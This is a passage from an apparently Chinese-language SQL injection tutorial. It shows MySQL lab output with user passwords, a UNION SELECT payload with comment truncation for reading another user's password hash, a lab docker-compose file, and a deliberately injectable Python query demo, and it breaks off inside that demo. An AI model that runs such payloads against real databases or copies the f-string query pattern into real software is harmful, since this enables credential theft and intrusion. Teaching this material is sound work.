<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;">  </span><span style="color:#005CC5;">9</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">|</span><span style="color:#24292E;"> admin1   </span><span style="color:#D73A49;">|</span><span style="color:#24292E;"> admin1     </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">10</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">|</span><span style="color:#24292E;"> admin2   </span><span style="color:#D73A49;">|</span><span style="color:#24292E;"> admin2     </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">11</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">|</span><span style="color:#24292E;"> admin3   </span><span style="color:#D73A49;">|</span><span style="color:#24292E;"> admin3     </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">12</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">|</span><span style="color:#24292E;"> dhakkan  </span><span style="color:#D73A49;">|</span><span style="color:#24292E;"> dumbo      </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">14</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">|</span><span style="color:#24292E;"> admin4   </span><span style="color:#D73A49;">|</span><span style="color:#24292E;"> admin4     </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">+</span><span style="color:#B31D28;font-style:italic;">----</span><span style="color:#D73A49;">+</span><span style="color:#B31D28;font-style:italic;">----------</span><span style="color:#D73A49;">+</span><span style="color:#B31D28;font-style:italic;">------------</span><span style="color:#D73A49;">+</span></span>
<span class="line"><span style="color:#005CC5;">13</span><span style="color:#24292E;"> rows </span><span style="color:#D73A49;">in</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">set</span><span style="color:#24292E;"> (</span><span style="color:#005CC5;">0.01</span><span style="color:#24292E;"> sec)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#24292E;">mysql</span><span style="color:#D73A49;">&gt;</span><span style="color:#24292E;"> select concat(</span><span style="color:#005CC5;">id</span><span style="color:#24292E;">,username,password) </span><span style="color:#D73A49;">from</span><span style="color:#24292E;"> users</span><span style="color:#B31D28;font-style:italic;">;</span></span>
<span class="line"><span style="color:#D73A49;">+</span><span style="color:#B31D28;font-style:italic;">------------------------------</span><span style="color:#D73A49;">+</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;"> concat(</span><span style="color:#005CC5;">id</span><span style="color:#24292E;">,username,password) </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">+</span><span style="color:#B31D28;font-style:italic;">------------------------------</span><span style="color:#D73A49;">+</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;"> </span><span style="color:#B31D28;font-style:italic;">1DumbDumb</span><span style="color:#24292E;">                    </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;"> </span><span style="color:#B31D28;font-style:italic;">2AngelinaI</span><span style="color:#D73A49;">-</span><span style="color:#24292E;">kill</span><span style="color:#D73A49;">-</span><span style="color:#24292E;">you          </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;"> </span><span style="color:#B31D28;font-style:italic;">3Dummyp</span><span style="color:#D73A49;">@</span><span style="color:#24292E;">ssword               </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;"> </span><span style="color:#B31D28;font-style:italic;">4securecrappy</span><span style="color:#24292E;">                </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;"> </span><span style="color:#B31D28;font-style:italic;">5stupidstupidity</span><span style="color:#24292E;">             </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;"> </span><span style="color:#B31D28;font-style:italic;">6supermangenious</span><span style="color:#24292E;">             </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;"> </span><span style="color:#B31D28;font-style:italic;">7batmanmob!</span><span style="color:#24292E;">le                </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;"> </span><span style="color:#B31D28;font-style:italic;">8adminadmin</span><span style="color:#24292E;">                  </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;"> </span><span style="color:#B31D28;font-style:italic;">9admin1admin1</span><span style="color:#24292E;">                </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;"> </span><span style="color:#B31D28;font-style:italic;">10admin2admin2</span><span style="color:#24292E;">               </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;"> </span><span style="color:#B31D28;font-style:italic;">11admin3admin3</span><span style="color:#24292E;">               </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;"> </span><span style="color:#B31D28;font-style:italic;">12dhakkandumbo</span><span style="color:#24292E;">               </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;"> </span><span style="color:#B31D28;font-style:italic;">14admin4admin4</span><span style="color:#24292E;">               </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">+</span><span style="color:#B31D28;font-style:italic;">------------------------------</span><span style="color:#D73A49;">+</span></span>
<span class="line"><span style="color:#005CC5;">13</span><span style="color:#24292E;"> rows </span><span style="color:#D73A49;">in</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">set</span><span style="color:#24292E;"> (</span><span style="color:#005CC5;">0.01</span><span style="color:#24292E;"> sec)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#24292E;">mysql</span><span style="color:#D73A49;">&gt;</span><span style="color:#24292E;"> select concat(</span><span style="color:#005CC5;">id</span><span style="color:#24292E;">,username,password) </span><span style="color:#D73A49;">from</span><span style="color:#24292E;"> users</span><span style="color:#B31D28;font-style:italic;">;</span></span>
<span class="line"><span style="color:#D73A49;">+</span><span style="color:#B31D28;font-style:italic;">------------------------------</span><span style="color:#D73A49;">+</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;"> concat(</span><span style="color:#005CC5;">id</span><span style="color:#24292E;">,username,password) </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">+</span><span style="color:#B31D28;font-style:italic;">------------------------------</span><span style="color:#D73A49;">+</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;"> </span><span style="color:#B31D28;font-style:italic;">1DumbDumb</span><span style="color:#24292E;">                    </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;"> </span><span style="color:#B31D28;font-style:italic;">2AngelinaI</span><span style="color:#D73A49;">-</span><span style="color:#24292E;">kill</span><span style="color:#D73A49;">-</span><span style="color:#24292E;">you          </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;"> </span><span style="color:#B31D28;font-style:italic;">3Dummyp</span><span style="color:#D73A49;">@</span><span style="color:#24292E;">ssword               </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;"> </span><span style="color:#B31D28;font-style:italic;">4securecrappy</span><span style="color:#24292E;">                </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;"> </span><span style="color:#B31D28;font-style:italic;">5stupidstupidity</span><span style="color:#24292E;">             </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;"> </span><span style="color:#B31D28;font-style:italic;">6supermangenious</span><span style="color:#24292E;">             </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;"> </span><span style="color:#B31D28;font-style:italic;">7batmanmob!</span><span style="color:#24292E;">le                </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;"> </span><span style="color:#B31D28;font-style:italic;">8adminadmin</span><span style="color:#24292E;">                  </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;"> </span><span style="color:#B31D28;font-style:italic;">9admin1admin1</span><span style="color:#24292E;">                </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;"> </span><span style="color:#B31D28;font-style:italic;">10admin2admin2</span><span style="color:#24292E;">               </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;"> </span><span style="color:#B31D28;font-style:italic;">11admin3admin3</span><span style="color:#24292E;">               </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;"> </span><span style="color:#B31D28;font-style:italic;">12dhakkandumbo</span><span style="color:#24292E;">               </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;"> </span><span style="color:#B31D28;font-style:italic;">14admin4admin4</span><span style="color:#24292E;">               </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">+</span><span style="color:#B31D28;font-style:italic;">------------------------------</span><span style="color:#D73A49;">+</span></span>
<span class="line"><span style="color:#005CC5;">13</span><span style="color:#24292E;"> rows </span><span style="color:#D73A49;">in</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">set</span><span style="color:#24292E;"> (</span><span style="color:#005CC5;">0.01</span><span style="color:#24292E;"> sec)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#24292E;">mysql</span><span style="color:#D73A49;">&gt;</span><span style="color:#24292E;"> select group_concat(</span><span style="color:#005CC5;">id</span><span style="color:#24292E;">,username separator </span><span style="color:#032F62;">&#39;_&#39;</span><span style="color:#24292E;">) </span><span style="color:#D73A49;">from</span><span style="color:#24292E;"> users</span><span style="color:#B31D28;font-style:italic;">;</span></span>
<span class="line"><span style="color:#D73A49;">+</span><span style="color:#B31D28;font-style:italic;">--------------------------------------------------------------------------------------------------------------</span><span style="color:#D73A49;">+</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;"> group_concat(</span><span style="color:#005CC5;">id</span><span style="color:#24292E;">,username separator </span><span style="color:#032F62;">&#39;_&#39;</span><span style="color:#24292E;">)                                                                      </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">+</span><span style="color:#B31D28;font-style:italic;">--------------------------------------------------------------------------------------------------------------</span><span style="color:#D73A49;">+</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;"> </span><span style="color:#B31D28;font-style:italic;">1Dumb_2Angelina_3Dummy_4secure_5stupid_6superman_7batman_8admin_9admin1_10admin2_11admin3_12dhakkan_14admin4</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">+</span><span style="color:#B31D28;font-style:italic;">--------------------------------------------------------------------------------------------------------------</span><span style="color:#D73A49;">+</span></span>
<span class="line"><span style="color:#005CC5;">1</span><span style="color:#24292E;"> row </span><span style="color:#D73A49;">in</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">set</span><span style="color:#24292E;"> (</span><span style="color:#005CC5;">0.00</span><span style="color:#24292E;"> sec)</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br></div></div><h2 id="前置知识" tabindex="-1">前置知识 <a class="header-anchor" href="#前置知识" aria-label="Permalink to &quot;前置知识&quot;">​</a></h2><p>接着上一节的节奏走，如果我们传入的 <code>username</code> 参数中有单引号会发生什么呢</p><blockquote><p>以下所举的例子都在 MySQL 5.x 版本完成</p></blockquote><p>现在我们传入 <code>Liki4&#39;</code> 这个字符串</p><p><img src="https://cdn.xyxsw.site/boxcn8TrpE02fnPV7dFzkmnHiAe.png" alt=""></p><p>很遗憾，报错了，这个查询因为 SQL 语句存在语法错误而无法完成。</p><p>那么问题来了，怎么让他不报错的情况下完成查询呢？</p><p>在 MySQL 语句中， <code>#</code> 和 <code>--</code> 代表行间注释，与 C 语言的 <code>//</code> 和 Python 中的 <code>#</code> 是同样的意思。也就是说，一个 MySQL 语句中如果存在 <code>#</code> 和 <code>--</code> ，那么这一行其后的所有字符都将视为注释，不予执行。</p><p>那如果我们传入 <code>Liki4&#39;;#</code> 这个字符串，那么在拼接后的查询又是什么结果呢</p><p><img src="https://cdn.xyxsw.site/boxcnbAKreqEeZxOYQuQMtZbd9d.png" alt=""></p><p>很显然， <code>#</code> 号将原本语句的 <code>&#39;;</code> 注释掉了</p><p>而我们传入的字符串构成了全新的语法正确的语句，并完成了一次查询！</p><p>那我们是否可以查询一些... 不属于我们自己的信息呢？答案是可以的。</p><p>例如我们传入一个精心构造的字符串</p><p><code>raw_sql_danger&#39; UNION SELECT password FROM users WHERE username = &#39;Liki5&#39;;#</code></p><p><img src="https://cdn.xyxsw.site/boxcniDohuM3F8FbMqz7YSC0Y5g.png" alt=""></p><p><strong>真是惊人的壮举！我完全不认识这个叫 Liki5 的家伙，但我居然知道了他的密码对应的哈希值！</strong></p><p><del>那么到这里 SQL 注入你就已经完全学会了，接下来做一些小练习吧。</del></p><p><del>请挖掘 Django ORM 最新版本的注入漏洞并与我分享，我会请你喝一杯奶茶作为谢礼。</del></p><h2 id="sql-注入入门" tabindex="-1">SQL 注入入门 <a class="header-anchor" href="#sql-注入入门" aria-label="Permalink to &quot;SQL 注入入门&quot;">​</a></h2><p>接下来的举例几乎都不会以 Web 的形式出现，虽然你去看别的文档都是起个 Web 应用，但我懒</p><p>反正都是一样的东西，是否以 Web 应用的形式没差，请不要来杠</p><h3 id="sql-注入的常见类型" tabindex="-1">SQL 注入的常见类型 <a class="header-anchor" href="#sql-注入的常见类型" aria-label="Permalink to &quot;SQL 注入的常见类型&quot;">​</a></h3><p>SQL 注入的常见类型分为以下几种，在后面的章节里会慢慢地讲述不同类型的区别和攻击手法</p><p>按照攻击手法来分类可以分为以下几种</p><ol><li>有回显的 SQL 注入</li><li>无回显的 SQL 盲注</li><li>布尔盲注</li><li>时间盲注</li><li>基于报错的 SQL 注入</li><li>堆叠注入</li><li>二次注入</li></ol><p>按照注入点来分类可以分为以下几种</p><ol><li>字符型注入</li><li>数字型注入</li></ol><p>注入点的分类只在于语句构造时微小的区别，因此不作详细的说明</p><p>当然，不同的数据库后端因为其不同的内置函数等差异，有着不同的攻击手法，但都大同小异。</p><p>常见的数据库有下列几个</p><ol><li>MySQL</li><li>MSSQL</li><li>OracleDB</li><li>SQLite</li></ol><p>当然还有一些新兴的<del>前沿科技</del>数据库</p><ol><li>ClickHouse</li><li>PostgreSQL</li></ol><p>还有一些和传统数据库设计理念不一样的 noSQL 数据库</p><ol><li>MongoDB</li><li>AmazonRD</li><li>...</li></ol><p>后续的章节里，会采用入门时最常见的 MySQL 数据库来举例，环境可以用 Docker 简单地创建一个</p><div class="language-yaml vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">yaml</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#6A737D;"># docker-compose.yml</span></span>
<span class="line"><span style="color:#6A737D;"># docker-compose up -d --build</span></span>
<span class="line"></span>
<span class="line"><span style="color:#85E89D;">version</span><span style="color:#E1E4E8;">: </span><span style="color:#9ECBFF;">&quot;3.8&quot;</span></span>
<span class="line"><span style="color:#85E89D;">services</span><span style="color:#E1E4E8;">:</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#85E89D;">db</span><span style="color:#E1E4E8;">:</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#85E89D;">image</span><span style="color:#E1E4E8;">: </span><span style="color:#9ECBFF;">mysql:5.7</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#85E89D;">container_name</span><span style="color:#E1E4E8;">: </span><span style="color:#9ECBFF;">&quot;mysql5-docker&quot;</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#85E89D;">command</span><span style="color:#E1E4E8;">: </span><span style="color:#9ECBFF;">--default-authentication-plugin=mysql_native_password --character-set-server=utf8mb4 --collation-server=utf8mb4_unicode_ci --sql-mode=&#39;&#39;</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#85E89D;">ports</span><span style="color:#E1E4E8;">:</span></span>
<span class="line"><span style="color:#E1E4E8;">            - </span><span style="color:#9ECBFF;">&quot;3305:3306&quot;</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#85E89D;">environment</span><span style="color:#E1E4E8;">:</span></span>
<span class="line"><span style="color:#E1E4E8;">            - </span><span style="color:#9ECBFF;">MYSQL_ROOT_PASSWORD=TjsDgwGPz5ANbJUU</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#85E89D;">healthcheck</span><span style="color:#E1E4E8;">:</span></span>
<span class="line"><span style="color:#E1E4E8;">            </span><span style="color:#85E89D;">test</span><span style="color:#E1E4E8;">: [</span><span style="color:#9ECBFF;">&quot;CMD&quot;</span><span style="color:#E1E4E8;">, </span><span style="color:#9ECBFF;">&quot;mysqladmin&quot;</span><span style="color:#E1E4E8;"> ,</span><span style="color:#9ECBFF;">&quot;ping&quot;</span><span style="color:#E1E4E8;">, </span><span style="color:#9ECBFF;">&quot;-h&quot;</span><span style="color:#E1E4E8;">, </span><span style="color:#9ECBFF;">&quot;localhost&quot;</span><span style="color:#E1E4E8;">]</span></span>
<span class="line"><span style="color:#E1E4E8;">            </span><span style="color:#85E89D;">interval</span><span style="color:#E1E4E8;">: </span><span style="color:#9ECBFF;">2s</span></span>
<span class="line"><span style="color:#E1E4E8;">            </span><span style="color:#85E89D;">timeout</span><span style="color:#E1E4E8;">: </span><span style="color:#9ECBFF;">5s</span></span>
<span class="line"><span style="color:#E1E4E8;">            </span><span style="color:#85E89D;">retries</span><span style="color:#E1E4E8;">: </span><span style="color:#79B8FF;">30</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#6A737D;"># docker-compose.yml</span></span>
<span class="line"><span style="color:#6A737D;"># docker-compose up -d --build</span></span>
<span class="line"></span>
<span class="line"><span style="color:#22863A;">version</span><span style="color:#24292E;">: </span><span style="color:#032F62;">&quot;3.8&quot;</span></span>
<span class="line"><span style="color:#22863A;">services</span><span style="color:#24292E;">:</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#22863A;">db</span><span style="color:#24292E;">:</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#22863A;">image</span><span style="color:#24292E;">: </span><span style="color:#032F62;">mysql:5.7</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#22863A;">container_name</span><span style="color:#24292E;">: </span><span style="color:#032F62;">&quot;mysql5-docker&quot;</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#22863A;">command</span><span style="color:#24292E;">: </span><span style="color:#032F62;">--default-authentication-plugin=mysql_native_password --character-set-server=utf8mb4 --collation-server=utf8mb4_unicode_ci --sql-mode=&#39;&#39;</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#22863A;">ports</span><span style="color:#24292E;">:</span></span>
<span class="line"><span style="color:#24292E;">            - </span><span style="color:#032F62;">&quot;3305:3306&quot;</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#22863A;">environment</span><span style="color:#24292E;">:</span></span>
<span class="line"><span style="color:#24292E;">            - </span><span style="color:#032F62;">MYSQL_ROOT_PASSWORD=TjsDgwGPz5ANbJUU</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#22863A;">healthcheck</span><span style="color:#24292E;">:</span></span>
<span class="line"><span style="color:#24292E;">            </span><span style="color:#22863A;">test</span><span style="color:#24292E;">: [</span><span style="color:#032F62;">&quot;CMD&quot;</span><span style="color:#24292E;">, </span><span style="color:#032F62;">&quot;mysqladmin&quot;</span><span style="color:#24292E;"> ,</span><span style="color:#032F62;">&quot;ping&quot;</span><span style="color:#24292E;">, </span><span style="color:#032F62;">&quot;-h&quot;</span><span style="color:#24292E;">, </span><span style="color:#032F62;">&quot;localhost&quot;</span><span style="color:#24292E;">]</span></span>
<span class="line"><span style="color:#24292E;">            </span><span style="color:#22863A;">interval</span><span style="color:#24292E;">: </span><span style="color:#032F62;">2s</span></span>
<span class="line"><span style="color:#24292E;">            </span><span style="color:#22863A;">timeout</span><span style="color:#24292E;">: </span><span style="color:#032F62;">5s</span></span>
<span class="line"><span style="color:#24292E;">            </span><span style="color:#22863A;">retries</span><span style="color:#24292E;">: </span><span style="color:#005CC5;">30</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><h3 id="有回显的-sql-注入" tabindex="-1">有回显的 SQL 注入 <a class="header-anchor" href="#有回显的-sql-注入" aria-label="Permalink to &quot;有回显的 SQL 注入&quot;">​</a></h3><p>我这里写了一个小 demo 来进行展示，demo 代码如下，为了好看我用 prettytable 格式化了输出</p><div class="language-python vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">python</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#6A737D;">#!/usr/bin/python</span></span>
<span class="line"><span style="color:#6A737D;"># -*- coding: UTF-8 -*-</span></span>
<span class="line"></span>
<span class="line"><span style="color:#F97583;">from</span><span style="color:#E1E4E8;"> sqlalchemy </span><span style="color:#F97583;">import</span><span style="color:#E1E4E8;"> create_engine</span></span>
<span class="line"><span style="color:#F97583;">from</span><span style="color:#E1E4E8;"> prettytable </span><span style="color:#F97583;">import</span><span style="color:#E1E4E8;"> from_db_cursor</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8;">engine </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> create_engine(</span><span style="color:#9ECBFF;">&quot;mysql+pymysql://root:TjsDgwGPz5ANbJUU@127.0.0.1:3305/sqli&quot;</span><span style="color:#E1E4E8;">, </span><span style="color:#FFAB70;">max_overflow</span><span style="color:#F97583;">=</span><span style="color:#79B8FF;">5</span><span style="color:#E1E4E8;">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#F97583;">def</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">query</span><span style="color:#E1E4E8;">(username):</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">with</span><span style="color:#E1E4E8;"> engine.connect() </span><span style="color:#F97583;">as</span><span style="color:#E1E4E8;"> con:</span></span>
<span class="line"><span style="color:#E1E4E8;">        cur </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> con.execute(</span><span style="color:#F97583;">f</span><span style="color:#9ECBFF;">&quot;SELECT * FROM users WHERE username = &#39;</span><span style="color:#79B8FF;">{</span><span style="color:#E1E4E8;">username</span><span style="color:#79B8FF;">}</span><span style="color:#9ECBFF;">&#39;&quot;</span><span style="color:#E1E4E8;">).cursor</span></span>
<span class="line"><span style="color:#E1E4E8;">        x </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> from_db_cursor(cur)</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#F97583;">return</span><span style="color:#E1E4E8;">(x)    </span><span style="color:#6A737D;"># 返回查询的结果</span></span>
<span class="line"></span>
<span class="line"><span style="color:#F97583;">def</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">main</span><span style="color:#E1E4E8;">():</span></span>
<span class="line"><span style="color:#E1E4E8;">    username </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">input</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&quot;Give me your username: &quot;</span><span style="color:#E1E4E8;">)</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#79B8FF;">print</span><span style="color:#E1E4E8;">(query(username))</span></span>
<span class="line"></span>
<span class="line"><span style="color:#F97583;">if</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">__name__</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">==</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;__main__&quot;</span><span style="color:#E1E4E8;">:</span></span>
<span class="line"><span style="color:#E1E4E8;">    main()</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#6A737D;">#!/usr/bin/python</span></span>
<span class="line"><span style="color:#6A737D;"># -*- coding: UTF-8 -*-</span></span>
<span class="line"></span>
<span class="line"><span style="color:#D73A49;">from</span><span style="color:#24292E;"> sqlalchemy </span><span style="color:#D73A49;">import</span><span style="color:#24292E;"> create_engine</span></span>
<span class="line"><span style="color:#D73A49;">from</span><span style="color:#24292E;"> prettytable </span><span style="color:#D73A49;">import</span><span style="color:#24292E;"> from_db_cursor</span></span>
<span class="line"></span>
<span class="line"><span style="color:#24292E;">engine </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> create_engine(</span><span style="color:#032F62;">&quot;mysql+pymysql://root:TjsDgwGPz5ANbJUU@127.0.0.1:3305/sqli&quot;</span><span style="color:#24292E;">, </span><span style="color:#E36209;">max_overflow</span><span style="color:#D73A49;">=</span><span style="color:#005CC5;">5</span><span style="color:#24292E;">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#D73A49;">def</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">query</span><span style="color:#24292E;">(username):</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">with</span><span style="color:#24292E;"> engine.connect() </span><span style="color:#D73A49;">as</span><span style="color:#24292E;"> con:</span></span>
<span class="line"><span style="color:#24292E;">        cur </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> con.execute(</span><span style="color:#D73A49;">f</span><span style="color:#032F62;">&quot;SELECT * FROM users WHERE username = &#39;</span><span style="color:#005CC5;">{</span><span style="color:#24292E;">username</span><span style="color:#005CC5;">}</span><span style="color:#032F62;">&#39;&quot;</span><span style="color:#24292E;">).cursor</span></span>
<span class="line"><span style="color:#24292E;">        x </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> from_db_cursor(cur)</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#D73A49;">return</span><span style="color:#24292E;">(x)    </span><span style="color:#6A737D;"># 返回查询的结果</span></span>
<span class="line"></span>
<span class="line"><span style="color:#D73A49;">def</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">main</span><span style="color:#24292E;">():</span></span>
<span class="line"><span style="color:#24292E;">    username </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">input</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&quot;Give me your username: &quot;</span><span style="color:#24292E;">)</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#005CC5;">print</span><span style="color:#24292E;">(query(username))</span></span>
<span class="line"></span>
